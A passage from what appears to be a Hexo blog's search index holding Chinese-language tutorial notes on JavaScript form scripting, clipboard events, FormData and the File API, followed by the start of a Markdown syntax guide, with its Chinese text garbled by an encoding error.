/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"China"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Submit Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"reset"</span>&gt;</span>Reset Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- HTML5çº¦æŸéªŒè¯API --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text/email/url"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">min</span>=<span class="string">"0"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">step</span>=<span class="string">"5"</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  input.stepUp(1);</span></span><br><span class="line"><span class="comment">  input.stepDown(1);</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç‚¹å‡»submit buttonæ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨submitæ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"myForm"</span>);</span><br><span class="line">EventUtil.addHandler(form, <span class="string">"submit"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// é˜»æ­¢è¡¨å•æäº¤ï¼Œå…ˆè¡ŒéªŒè¯è¡¨å•æ•°æ®</span></span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è¡¨å•å­—æ®µçš„å…±æœ‰å±æ€§</span></span><br><span class="line">  <span class="keyword">var</span> field = form.elements[<span class="number">0</span>];</span><br><span class="line">  field.value = <span class="string">"Another value"</span>;  <span class="comment">// è®¾ç½®å­—æ®µå°†è¢«æäº¤åˆ°æœåŠ¡å™¨çš„å€¼</span></span><br><span class="line">  field.disabled = <span class="literal">true</span>;          <span class="comment">// ç¦ç”¨å½“å‰å­—æ®µ</span></span><br><span class="line">  field.type;                     <span class="comment">// å­—æ®µçš„ç±»å‹ï¼Œå¦‚checkbox, radio</span></span><br><span class="line">  field.readOnly                  <span class="comment">// å½“å‰å­—æ®µæ˜¯å¦åªè¯»</span></span><br><span class="line">  field.focus();                  <span class="comment">// æŠŠç„¦ç‚¹è®¾ç½®åˆ°å½“å‰å­—æ®µï¼Œå®ç°è‡ªåŠ¨åˆ‡æ¢ç„¦ç‚¹</span></span><br><span class="line">  field.blur();                   <span class="comment">// å¤±å»ç„¦ç‚¹</span></span><br><span class="line">  field.select();                 <span class="comment">// é€‰ä¸­input, textareaçš„å†…å®¹</span></span><br><span class="line">  form.submit();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‚¹å‡»reset buttonæ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨resetæ–¹æ³•</span></span><br><span class="line">EventUtil.addHandler(form, <span class="string">"reset"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  form.reset();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-æ–‡æœ¬æ¡†è„šæœ¬"><a href="#2-æ–‡æœ¬æ¡†è„šæœ¬" class="headerlink" title="2. æ–‡æœ¬æ¡†è„šæœ¬"></a>2. æ–‡æœ¬æ¡†è„šæœ¬</h3><h4 id="2-1-changeäº‹ä»¶"><a href="#2-1-changeäº‹ä»¶" class="headerlink" title="2.1 changeäº‹ä»¶"></a>2.1 changeäº‹ä»¶</h4><p>å¯¹äº<code>&lt;input&gt;</code>å’Œ<code>&lt;textarea&gt;</code>ï¼Œå½“å®ƒä»¬è·å¾—ç„¦ç‚¹åˆ°å¤±å»ç„¦ç‚¹ä¸”valueå€¼æ”¹å˜æ—¶ï¼Œæ‰ä¼šè§¦å‘changeäº‹ä»¶ã€‚å¯¹äº<code>&lt;select&gt;</code>ï¼Œåªè¦ç”¨æˆ·é€‰æ‹©äº†ä¸åŒçš„é€‰é¡¹ï¼Œå°±ä¼šè§¦å‘changeäº‹ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">EventUtil.addHandler(textbox, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.target.value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-selectäº‹ä»¶"><a href="#2-2-selectäº‹ä»¶" class="headerlink" title="2.2 selectäº‹ä»¶"></a>2.2 selectäº‹ä»¶</h4><p>ä½¿ç”¨<code>select()</code>å¯ä»¥é€‰ä¸­æ–‡æœ¬ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">textbox.select();</span><br><span class="line">textbox.setSelectionRange(<span class="number">0</span>, textbox.value.length);  <span class="comment">// "hello world"</span></span><br><span class="line">textbox.setSeelctionRange(<span class="number">0</span>, <span class="number">3</span>);                     <span class="comment">// "hel"</span></span><br></pre></td></tr></table></figure></p><p>åŒæ—¶å½“ä½ åœ¨é¡µé¢ä¸­é€‰æ‹©æ–‡æœ¬æ—¶ï¼Œä¼šè§¦å‘selectäº‹ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"select"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'text selected'</span> + textbox.value.substring(textbox.selectionStart, textbox.selectionEnd));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h4 id="2-3-å‰ªè´´æ¿äº‹ä»¶"><a href="#2-3-å‰ªè´´æ¿äº‹ä»¶" class="headerlink" title="2.3 å‰ªè´´æ¿äº‹ä»¶"></a>2.3 å‰ªè´´æ¿äº‹ä»¶</h4><table><thead><tr><th>å‰ªè´´æ¿äº‹ä»¶</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>beforecopy</td><td style="text-align:center">å¤åˆ¶å‰è§¦å‘</td></tr><tr><td>copy</td><td style="text-align:center">å¤åˆ¶æ—¶è§¦å‘</td></tr><tr><td>beforecut</td><td style="text-align:center">å‰ªåˆ‡å‰è§¦å‘</td></tr><tr><td>cut</td><td style="text-align:center">å‰ªåˆ‡æ—¶è§¦å‘</td></tr><tr><td>beforepaste</td><td style="text-align:center">ç²˜è´´å‰è§¦å‘</td></tr><tr><td>paste</td><td style="text-align:center">ç²˜è´´æ—¶è§¦å‘</td></tr></tbody></table><p>è¦è®¿é—®å‰ªè´´æ¿ä¸­çš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨<code>clipboardData</code>å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æœ‰ä¸‰ä¸ªæ–¹æ³•: getData(), setData(), clearData()<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  <span class="comment">// è·å–å‰ªè´´æ¿çš„æ–‡å­—</span></span><br><span class="line">  getClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clipboardData = (event.clipboardData || <span class="built_in">window</span>.clipboardData);</span><br><span class="line">    <span class="keyword">return</span> clipboardData.getData(<span class="string">"text"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// è®¾ç½®å‰ªè´´æ¿çš„æ–‡å­—</span></span><br><span class="line">  setClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event, value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.clipboardData)&#123;</span><br><span class="line">      retrun event.clipboardData.setData(<span class="string">"text/plain"</span>, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.clipboardData)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">window</span>.clipboardData.setData(<span class="string">"text"</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®ç²˜è´´çš„å†…å®¹</span></span><br><span class="line">EventUtil.addHanler(textbox, <span class="string">"paste"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> text = EventUtil.getClipboardText(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç¡®ä¿åªæœ‰æ•°å€¼æ‰ä¼šè¢«ç²˜è´´åˆ°æ–‡æœ¬æ¡†ä¸­</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d*$/</span>.test(text))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-keypressäº‹ä»¶è¿‡æ»¤è¾“å…¥"><a href="#2-4-keypressäº‹ä»¶è¿‡æ»¤è¾“å…¥" class="headerlink" title="2.4 keypressäº‹ä»¶è¿‡æ»¤è¾“å…¥"></a>2.4 keypressäº‹ä»¶è¿‡æ»¤è¾“å…¥</h4><p>å“åº”æ–‡æœ¬æ¡†çš„keypressäº‹ä»¶ï¼Œé˜»æ­¢è¿™ä¸ªäº‹ä»¶çš„é»˜è®¤è¡Œä¸ºæ¥å±è”½æ­¤ç±»å­—ç¬¦ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"keypress"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> charCode = EventUtil.getCharCode(event);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/\d/</span>.test(<span class="built_in">String</span>.fromCharCode(charCode)))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-é€‰æ‹©æ¡†è„šæœ¬"><a href="#3-é€‰æ‹©æ¡†è„šæœ¬" class="headerlink" title="3. é€‰æ‹©æ¡†è„šæœ¬"></a>3. é€‰æ‹©æ¡†è„šæœ¬</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- multiple æ˜¯å¦å¤šé€‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>options</code>åŒ…å«äº†æ‰€æœ‰é€‰é¡¹ã€‚æ¯ä¸ª<code>options[i]</code>éƒ½æœ‰index, label, selected, text, valueå±æ€§ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selectbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="string">'location'</span>];</span><br><span class="line">selectbox.options[<span class="number">0</span>].text;    <span class="comment">// é€‰çº¿çš„æ–‡æœ¬</span></span><br><span class="line">selectbox.options[<span class="number">0</span>].value;   <span class="comment">// é€‰é¡¹çš„å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰ä¸­çš„é€‰é¡¹ selectedIndex</span></span><br><span class="line"><span class="keyword">var</span> selectedIndex = selectbox.selectedIndex;</span><br><span class="line"><span class="keyword">var</span> selectedOption = selectbox.options[selectedIndex];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–°å¢é€‰é¡¹</span></span><br><span class="line"><span class="keyword">var</span> newOption = <span class="keyword">new</span> Option(<span class="string">"Option text"</span>, <span class="string">"Option value"</span>);</span><br><span class="line">selectbox.add(newOption, <span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç§»é™¤é€‰é¡¹</span></span><br><span class="line">seletbox.remove(<span class="number">0</span>)  <span class="comment">// ç§»é™¤ç¬¬ä¸€ä¸ªé€‰é¡¹</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-è¡¨å•åºåˆ—åŒ–ä¸formData"><a href="#4-è¡¨å•åºåˆ—åŒ–ä¸formData" class="headerlink" title="4. è¡¨å•åºåˆ—åŒ–ä¸formData"></a>4. è¡¨å•åºåˆ—åŒ–ä¸formData</h3><p>æµè§ˆå™¨æ€æ ·æŠŠè¡¨å•æ•°æ®å‘é€ç»™æœåŠ¡å™¨ï¼š</p><ul><li>å¯¹è¡¨å•å­—æ®µçš„åç§°å’Œå€¼è¿›è¡ŒURLç¼–ç ï¼Œä½¿ç”¨(&amp;)åˆ†éš”ã€‚</li><li>ä¸å‘é€ç¦ç”¨çš„è¡¨å•å­—æ®µï¼Œä¸å‘é€typeä¸ºreset, button, imageçš„<code>&lt;button&gt;å’Œ&lt;input&gt;</code></li><li>åªå‘é€å‹¾é€‰çš„å¤é€‰æ¡†å’Œå•é€‰æŒ‰é’®ï¼Œå¤šé€‰é€‰æ‹©æ¡†ä¸­æ¯ä¸ªé€‰ä¸­çš„å€¼å•ç‹¬ä¸€ä¸ªæ¡ç›®</li></ul><p>XMLHttpRequest2ä¸ºè¡¨å•æ•°æ®å®šä¹‰äº†formDataç±»å‹ï¼Œæ–¹ä¾¿åˆ›å»ºä¸è¡¨å•æ ¼å¼ç›¸åŒçš„æ•°æ®ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®è¡¨å•å…ƒç´ å¡«å…¥é”®å€¼å¯¹</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.forms[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºäº†FormDataçš„å®ä¾‹åï¼Œå¯ä»¥å°†å®ƒç›´æ¥ä¼ ç»™XHRçš„send()æ–¹æ³•ã€‚ä½¿ç”¨FormDataçš„æ–¹ä¾¿ä¹‹å¤„ä½“ç°åœ¨ä¸å¿…æ˜ç¡®åœ°åœ¨XHRå¯¹è±¡ä¸Šè®¾ç½®è¯·æ±‚å¤´éƒ¨ã€‚XHRå¯¹è±¡èƒ½å¤Ÿè¯†åˆ«FormDataçš„å®ä¾‹ï¼Œå¹¶é…ç½®é€‚å½“çš„å¤´éƒ¨ä¿¡æ¯ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'user-info'</span>);</span><br><span class="line">  xhr.send(<span class="keyword">new</span> FormData(form));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-File-API"><a href="#5-File-API" class="headerlink" title="5. File API"></a>5. File API</h3><h4 id="5-1-Fileå¯¹è±¡"><a href="#5-1-Fileå¯¹è±¡" class="headerlink" title="5.1 Fileå¯¹è±¡"></a>5.1 Fileå¯¹è±¡</h4><p>2000å¹´å‰ï¼Œå¤„ç†æ–‡ä»¶çš„å”¯ä¸€æ–¹å¼æ˜¯åœ¨è¡¨å•ä¸­åŠ å…¥<code>&lt;input type=&quot;file&quot;&gt;</code>å­—æ®µã€‚åæ¥HTML5åœ¨DOMä¸­ä¸ºæ–‡ä»¶è¾“å…¥å…ƒç´ æ·»åŠ äº†ä¸€ä¸ªfilesé›†åˆã€‚é€‰æ‹©äº†ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æ—¶ï¼Œfilesé›†åˆä¸­å°†åŒ…å«ä¸€ç»„Fileå¯¹è±¡ï¼Œæ¯ä¸ªFileå¯¹è±¡éƒ½æœ‰ä¸‹åˆ—åªè¯»å±æ€§:</p><ul><li>name: æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶å</li><li>size: æ–‡ä»¶çš„å­—èŠ‚å¤§å°</li><li>type: å­—ç¬¦ä¸²ï¼Œæ–‡ä»¶çš„MIMEç±»å‹</li><li>lastModifiedDate: å­—ç¬¦ä¸²ï¼Œæ–‡ä»¶ä¸Šä¸€æ¬¡è¢«ä¿®æ”¹çš„æ—¶é—´</li></ul><p>é€šè¿‡ç›‘å¬changeäº‹ä»¶å¹¶è¯»å–filesé›†åˆå°±å¯ä»¥çŸ¥é“é€‰æ‹©çš„æ¯ä¸ªæ–‡ä»¶çš„ä¿¡æ¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileList = <span class="built_in">document</span>.getElementById(<span class="string">'files-list'</span>);</span><br><span class="line">EventUtil.addHanlder(fileList, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = event.files[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">console</span>.log(file.name + file.type + file.size + <span class="string">'bytes'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-ä½¿ç”¨XHRä¸Šä¼ æ–‡ä»¶"><a href="#5-2-ä½¿ç”¨XHRä¸Šä¼ æ–‡ä»¶" class="headerlink" title="5.2 ä½¿ç”¨XHRä¸Šä¼ æ–‡ä»¶"></a>5.2 ä½¿ç”¨XHRä¸Šä¼ æ–‡ä»¶</h4><p>å°†æ–‡ä»¶æ‹–è¿›æµè§ˆå™¨çª—å£ï¼Œè°ƒç”¨append()æ–¹æ³•ä¼ å…¥ç›¸åº”çš„fileå¯¹è±¡ï¼Œå†æŠŠFormDataå¯¹è±¡ä¼ é€’ç»™XHRçš„send()æ–¹æ³•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> droptarget = <span class="built_in">document</span>.getElementById(<span class="string">'droptarget'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleEvent</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.preventDefault(event);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (event.type == <span class="string">'drop'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">    <span class="keyword">var</span> files = event.dataTransfer.files;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++)&#123;</span><br><span class="line">      data.append(<span class="string">"file"</span> + i, files[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"post"</span>, <span class="string">"FileAPIExample06Upload.php"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragenter"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragover"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"drag"</span>, handleEvent);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-FileReaderç±»å‹"><a href="#5-3-FileReaderç±»å‹" class="headerlink" title="5.3 FileReaderç±»å‹"></a>5.3 FileReaderç±»å‹</h4><p>FileReaderæ˜¯ä¸€ç§å¼‚æ­¥æ–‡ä»¶è¯»å–æœºåˆ¶ï¼ŒFileReaderæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ–¹æ³•:</p><ul><li>readAsText(file, encoding): ä»¥çº¯æ–‡æœ¬å½¢å¼è¯»å–æ–‡ä»¶ï¼Œå°†è¯»å–åˆ°çš„æ–‡æœ¬ä¿å­˜åœ¨resultå±æ€§ä¸­ã€‚</li><li>readAsDataURL(file): è¯»å–æ–‡ä»¶å¹¶å°†æ–‡ä»¶ä»¥æ•°æ®URIçš„å½¢å¼ä¿å­˜åœ¨resultå±æ€§ä¸­ã€‚</li><li>readAsBinaryString(file)</li><li>readAsArrayBuffer(file)<br>ç•¥</li></ul><p><br></p><h3 id="6-å¯Œæ–‡æœ¬ç¼–è¾‘"><a href="#6-å¯Œæ–‡æœ¬ç¼–è¾‘" class="headerlink" title="6. å¯Œæ–‡æœ¬ç¼–è¾‘"></a>6. å¯Œæ–‡æœ¬ç¼–è¾‘</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames[<span class="string">"richedit"</span>].document.designMode = <span class="string">"on"</span>;</span><br></pre></td></tr></table></figure><p>ç•¥</p><p><br></p><p><a href="https://juejin.im/post/5c9ac607f265da6103588b31" target="_blank" rel="noopener">https://juejin.im/post/5c9ac607f265da6103588b31</a><br><a href="https://juejin.im/post/5b55c118f265da0f6f1aa354" target="_blank" rel="noopener">https://juejin.im/post/5b55c118f265da0f6f1aa354</a></p>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Markdown è¯­æ³•</title>
      <link href="/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/"/>
      <url>/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h4 id="1-æ ‡é¢˜"><a href="#1-æ ‡é¢˜" class="headerlink" title="1. æ ‡é¢˜"></a>1. æ ‡é¢˜</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ä¸€çº§æ ‡é¢˜</span><br><span class="line">## äºŒçº§æ ‡é¢˜</span><br><span class="line">â€¦â€¦</span><br><span class="line">###### å…­çº§æ ‡é¢˜</span><br></pre></td></tr></table></figure><h4 id="2-å­—ä½“"><a href="#2-å­—ä½“" class="headerlink" title="2. å­—ä½“"></a>2. å­—ä½“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**è¿™æ˜¯åŠ ç²—çš„æ–‡å­—**</span><br><span class="line">*è¿™æ˜¯å€¾æ–œçš„æ–‡å­—*</span><br><span class="line">***è¿™æ˜¯æ–œä½“åŠ ç²—çš„æ–‡å­—***</span><br><span class="line">~~è¿™æ˜¯åŠ åˆ é™¤çº¿çš„æ–‡å­—~~</span><br></pre></td></tr></table></figure><h4 id="3-å¼•ç”¨"><a href="#3-å¼•ç”¨" class="headerlink" title="3. å¼•ç”¨"></a>3. å¼•ç”¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;è¿™æ˜¯å¼•ç”¨çš„å†…å®¹</span><br><span class="line">&gt;&gt;è¿™æ˜¯å¼•ç”¨çš„å†…å®¹</span><br></pre></td></tr></table></figure><h4 id="4-åˆ†å‰²çº¿"><a href="#4-åˆ†å‰²çº¿" class="headerlink" title="4. åˆ†å‰²çº¿"></a>4. åˆ†å‰²çº¿</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><h4 id="5-å›¾ç‰‡"><a href="#5-å›¾ç‰‡" class="headerlink" title="5. å›¾ç‰‡"></a>5. å›¾ç‰‡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![å›¾ç‰‡alt](å›¾ç‰‡åœ°å€ â€œå›¾ç‰‡titleâ€)</span><br></pre></td></tr></table></figure><p>å®‰è£…<code>npm install hexo-asset-image --save</code>, æ–°åŠ æ–‡ç« <code>hexo new</code></p><h4 id="6-è¶…é“¾æ¥"><a href="#6-è¶…é“¾æ¥" class="headerlink" title="6. è¶…é“¾æ¥"></a>6. è¶…é“¾æ¥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[è¶…é“¾æ¥å]ï¼ˆè¶…é“¾æ¥åœ°å€ï¼‰</span><br><span class="line">[ç®€ä¹¦](http://jianshu.com)</span><br></pre></td></tr></table></figure><h4 id="7-æ— 